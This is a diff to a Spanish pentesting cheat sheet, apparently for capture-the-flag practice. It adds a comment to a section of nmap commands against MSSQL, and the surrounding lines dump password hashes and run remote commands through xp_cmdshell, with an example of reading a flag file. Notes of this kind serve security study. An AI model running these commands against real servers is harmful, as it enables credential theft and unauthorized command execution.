@@ -245,6 +245,7 @@ También hay puertos por UDP que pertenecen al Samba como 137,138
 ❯ nmap ❮Target IP❯ -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=<passwd> # Nos muestra los hashes
 
 ❯ nmap ❮Target IP❯ -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=<passwd>,ms-sql-xp-cmdshell.cmd="ipconfig" # Podemos ejecutar comandos de forma remota usando la base de datos
+	# Podemos usar mas comandos como: 'type C:\flag.txt'
 ```
 
 ## LDAP
